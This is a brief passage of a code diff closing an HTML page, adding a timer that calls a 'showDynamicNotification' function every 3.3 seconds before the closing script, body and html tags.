+    setInterval(showDynamicNotification, 3300);
+
+  </script>
+</body>
+</html>
